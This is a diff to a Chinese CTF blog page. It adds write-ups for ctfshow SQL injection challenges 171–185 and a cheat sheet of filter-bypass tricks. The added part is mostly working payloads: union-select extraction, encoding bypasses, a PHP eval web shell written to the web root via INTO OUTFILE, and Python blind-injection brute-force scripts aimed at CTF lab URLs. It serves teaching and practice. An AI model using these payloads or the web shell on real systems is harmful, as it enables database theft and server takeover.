@@ -347,8 +347,7 @@
       
         
           
-            <p><img src="/../img/image-20240327235405326.png" alt="image-20240327235405326"></p>
-
+            
           
         
       
@@ -1514,6 +1513,101 @@
 <p><img src="/img/image-20231102202705326.png" alt="image-20231102202705326"></p>
 <p>别忘了传r，根据if的条件，$rand要等于0，所以传入<code>?r=435058645</code>,刷新得到flag</p>
 <p>ctfshow{e8e1e54d-da65-42bd-9a4b-6f88ccf56c43}</p>
+<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>在bp中传参时末尾的+不要url编码</p>
+<h3 id="171"><a href="#171" class="headerlink" title="171"></a>171</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 查数据库</span><br><span class="line">-1&#x27;union select 1,2,group_concat(schema_name) from information_schema.schemata--+</span><br><span class="line"># 查表名</span><br><span class="line">-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span><br><span class="line"># 查列名</span><br><span class="line">-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_user&#x27; --+</span><br><span class="line"># 查flag</span><br><span class="line">-1&#x27;union select id,username,password from ctfshow_user --+</span><br></pre></td></tr></table></figure>
+
+<h3 id="172"><a href="#172" class="headerlink" title="172"></a>172</h3><p>题目：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//检查结果是否有flag</span><br><span class="line">    if($row-&gt;username!==&#x27;flag&#x27;)&#123;</span><br><span class="line">      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<p>1、不查询username字段，绕过检测</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union select id,password from ctfshow_user2 --+</span><br></pre></td></tr></table></figure>
+
+<p>2、编码绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union select to_base64(username),hex(password) from ctfshow_user2 --+</span><br></pre></td></tr></table></figure>
+
+<p>3、通过171的题目入口联合查询ctfshow_user2，171没有过滤。前提是两个表在一个库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,username,password from ctfshow_user2 where ctfshow_user2.username = &#x27;flag&#x27; --+</span><br></pre></td></tr></table></figure>
+
+<p>4、3的衍生，使用别名,防止列名重复</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,b.username,b.password from ctfshow_user2 as b where b.username = &#x27;flag&#x27; --+</span><br></pre></td></tr></table></figure>
+
+<h3 id="174"><a href="#174" class="headerlink" title="174"></a>174</h3><p>mysql常用字符串函数：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/geaozhang/p/6739303.html">https://www.cnblogs.com/geaozhang/p/6739303.html</a></p>
+<p>题目：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#x27;/flag|[0-9]/i&#x27;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用replace函数替换flag中的数字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9999&#x27;union select &#x27;a&#x27;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(b.password,&#x27;0&#x27;,&#x27;)&#x27;),&#x27;1&#x27;,&#x27;!&#x27;),&#x27;2&#x27;,&#x27;@&#x27;),&#x27;3&#x27;,&#x27;#&#x27;),&#x27;4&#x27;,&#x27;$&#x27;),&#x27;5&#x27;,&#x27;%&#x27;),&#x27;6&#x27;,&#x27;^&#x27;),&#x27;7&#x27;,&#x27;&amp;&#x27;),&#x27;8&#x27;,&#x27;*&#x27;),&#x27;9&#x27;,&#x27;(&#x27;) from ctfshow_user4 as b where b.username = &#x27;flag --+</span><br></pre></td></tr></table></figure>
+
+<p>但是一直报错，原来是发包有坑，发出去的id值不是完整的</p>
+<p><img src="/img/image-20240417153255917.png" alt="image-20240417153255917"></p>
+<p>完整的如下</p>
+<p><img src="/img/image-20240417153311473.png" alt="image-20240417153311473"></p>
+<p>这种是知道数据库名的前提下，由于数据库名也有数字，所有也要替换。除此之外我们可以使用盲注。</p>
+<h3 id="175"><a href="#175" class="headerlink" title="175"></a>175</h3><p>1、写入网站根目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,password from ctfshow_user5 into outfile &#x27;/var/www/html/1.txt&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p>2、写马，但连不上数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,&quot;&lt;?php eval(@$_POST[1]); ?&gt;&quot; into outfile &#x27;/var/www/html/1.php&#x27; --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20240417194755829.png" alt="image-20240417194755829"></p>
+<h3 id="177"><a href="#177" class="headerlink" title="177"></a>177</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union/**/select/**/1,2,password/**/from/**/ctfshow_user/**/where/**/username=&#x27;flag&#x27;%23</span><br></pre></td></tr></table></figure>
+
+<p>- </p>
+<h3 id="182"><a href="#182" class="headerlink" title="182"></a>182</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;%0cor%0cusername%0clike&#x27;%la%</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;or(mid(username,1,1)=&#x27;f&#x27;)and&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<h3 id="183"><a href="#183" class="headerlink" title="183"></a>183</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">  $sql = &quot;select count(pass) from &quot;.$_POST[&#x27;tableName&#x27;].&quot;;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>pass应该就是password，去匹配ctfshow来查找</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://064788b5-2abd-4bed-8177-8aa66e6477bb.challenge.ctf.show/select-waf.php&quot;</span><br><span class="line"></span><br><span class="line">flagstr = &quot;ctfshow&#123;abdegijklmnpqruvxyz-0123456789&#125;&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(0, 50):</span><br><span class="line">    for x in flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;tableName&quot;: &quot;`ctfshow_user`where`pass`like&#x27;ctfshow&#123;&#125;%&#x27;&quot;.format(flag + x)</span><br><span class="line">            # &quot;tableName&quot;: &quot;`ctfshow_user`where`pass`regexp(&#x27;ctfshow&#123;&#125;&#x27;)&quot;.format(flag + x)</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line">        if (response.text.find(&quot;$user_count = 1;&quot;) &gt; 0):</span><br><span class="line">            flag += x</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<h3 id="184"><a href="#184" class="headerlink" title="184"></a>184</h3><p>分组查询语法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 字段列表 FROM 表名 [WHERE 条件] GROUP BY [HAVING 分组后过滤条件]</span><br></pre></td></tr></table></figure>
+
+<p>where和having的区别：where是分组之前进行过滤，不满足where条件，不参与分组;而having是分组之后对结果进行过滤</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://92152998-9415-41b7-911d-88bdaca6fbbe.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line">flagstr = <span class="string">&quot;&#123;abcdefghijklmnopqrstuvwxyz-0123456789&#125;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_hex</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    a = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        a+= <span class="built_in">hex</span>(<span class="built_in">ord</span>(x)).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>: <span class="string">&quot;ctfshow_user group by pass having pass regexp(0x&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(to_hex(flag + x))</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span>(response.text.find(<span class="string">&quot;$user_count = 1;&quot;</span>)&gt;<span class="number">0</span>):</span><br><span class="line">            flag += x</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;ctfshow&#123;&#125;&quot;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="185"><a href="#185" class="headerlink" title="185"></a>185</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert</span>(<span class="params">strs</span>):</span><br><span class="line">    t=<span class="string">&#x27;concat(&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> strs:</span><br><span class="line">       t+= <span class="string">&#x27;char(true&#x27;</span>+<span class="string">&#x27;+true&#x27;</span>*(<span class="built_in">ord</span>(s)-<span class="number">1</span>)+<span class="string">&#x27;),&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> t[:-<span class="number">1</span>]+<span class="string">&quot;)&quot;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://48fae3d2-6175-476d-a180-10a9ddaa0823.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line">s = <span class="string">&#x27;0123456789abcdef-&#123;&#125;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        d = convert(<span class="string">f&#x27;^ctfshow<span class="subst">&#123;flag + j&#125;</span>&#x27;</span>)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">f&#x27; ctfshow_user group by pass having pass regexp(<span class="subst">&#123;d&#125;</span>)&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;user_count = 1&quot;</span> <span class="keyword">in</span> r.text):</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;ctfshow&quot;</span>+flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="sql绕过总结"><a href="#sql绕过总结" class="headerlink" title="sql绕过总结"></a>sql绕过总结</h2><h3 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h3><ul>
+<li><code>%20</code>: 空格</li>
+<li><code>%09</code>: 水平制表符（Tab）</li>
+<li><code>%0A</code>: 换行符（LF）</li>
+<li><code>%0B</code>: 垂直制表符</li>
+<li><code>%0C</code>: 换页符（FF）</li>
+<li><code>%0D</code>: 回车符（CR）</li>
+<li><code>%A0</code>: 不间断空格（NBSP）</li>
+<li><code>%00</code>: 空字符（NULL)</li>
+<li>&#x2F;**&#x2F; ，()，&#96;，tab，两个空格</li>
+</ul>
+<p>注意在使用()绕过的时候，括号里边不能有*号</p>
+<p><img src="/img/image-20240418112900178.png" alt="image-20240418112900178"></p>
+<h3 id="or-and-xor-not-过滤绕过"><a href="#or-and-xor-not-过滤绕过" class="headerlink" title="or and xor not 过滤绕过"></a>or and xor not 过滤绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and = &amp;&amp; or = ||　　xor = | # 　　not = !</span><br></pre></td></tr></table></figure>
+
+<h3 id="号过滤绕过"><a href="#号过滤绕过" class="headerlink" title="&#x3D;号过滤绕过"></a>&#x3D;号过滤绕过</h3><p>1、<code>like</code>，&#x3D;号和不加通配符的 like 是一样的</p>
+<p><img src="/img/image-20240418112828379.png" alt="image-20240418112828379"></p>
+<p>2、还可以使用 <code>!&lt; &gt;</code>号来绕过，&lt;&gt; 在mysql中等于!&#x3D; 如果在加一个! 双重否定代表肯定 就是&#x3D;了</p>
+<p><img src="/img/image-20240418112843033.png" alt="image-20240418112843033"></p>
 
           
         
